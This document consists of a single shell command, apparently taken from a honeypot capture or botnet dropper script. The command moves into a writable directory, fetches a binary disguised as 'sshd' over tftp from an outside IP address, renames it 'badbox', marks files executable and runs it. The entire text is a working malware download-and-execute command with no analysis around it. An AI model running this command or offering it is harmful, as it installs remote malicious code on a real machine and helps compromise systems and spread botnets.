cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r sshd -g 107.191.48.91;cat sshd >badbox;chmod +x *;./badbox
